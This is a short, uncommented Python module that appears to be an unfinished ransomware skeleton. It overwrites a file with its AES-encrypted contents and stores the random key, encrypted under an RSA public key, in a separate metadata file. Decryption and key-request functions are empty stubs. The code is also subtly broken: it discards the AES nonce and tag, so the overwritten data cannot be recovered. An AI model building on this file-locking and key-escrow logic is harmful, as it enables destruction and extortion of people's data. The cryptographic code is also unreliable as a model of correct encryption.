import os

from Crypto.Cipher import PKCS1_OAEP
from Cryptodome.Cipher import AES
from Cryptodome.PublicKey import RSA


def getFileData(filename):
    with open(filename, 'r') as f:
        output = f.read()
    return bytearray(output, 'utf-8')


def encryptFile(filename, symmetric_key):
    cipher = AES.new(symmetric_key, AES.MODE_EAX)
    nonce = cipher.nonce
    ciphertext, tag = cipher.encrypt_and_digest(getFileData(filename))
    with open(filename, 'wb') as f:
        f.write(ciphertext)
    return

def encryptSymmKey():
    pass

def generateSymmKey(bits=16):
    random_key = os.urandom(bits)
    return random_key


def requestDecryptionKey(filename):
    return


def decryptFile(filename, symmetric_key):
    return

def encryptSymmInMetadata(filename, symmetric_key, puk):
    print(puk)
    rsa_cipher = PKCS1_OAEP.new(RSA.importKey(puk))
    data_encrypted = rsa_cipher.encrypt(symmetric_key)

    parts = filename.split("/")
    base = '/'.join(parts[:-1])
    metadataFile = base+"/metadata."+parts[-1]
    with open(metadataFile, 'wb') as f:
        f.write(data_encrypted)
    return metadataFile


